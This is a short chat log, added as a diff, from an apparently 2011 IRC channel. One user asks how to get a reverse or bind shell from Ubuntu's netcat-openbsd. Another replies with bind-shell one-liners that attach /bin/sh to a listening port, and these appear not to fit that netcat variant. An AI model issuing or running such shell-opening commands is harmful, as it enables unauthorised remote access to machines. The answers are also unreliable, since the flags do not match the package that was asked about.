@@ -1,0 +1,4 @@
+2011-11-22T05:25:00.000Z	sickn3ss		Quick question, how can I send a reverse shell or create a bind shell with the netcat-openbsd package from Ubuntu :-? the other ones have -e flag which allow me to do so. Also I only want to use this netcat and not mknod or telnet
+2011-11-22T05:27:00.000Z	SolarisBoy	sickn3ss	nc -L -d -p <port> -t -e /bin/sh
+2011-11-22T05:27:00.000Z	SolarisBoy	sickn3ss	try that
+2011-11-22T05:28:00.000Z	SolarisBoy	sickn3ss	actually nc -nvv -l -p -e /bin/sh
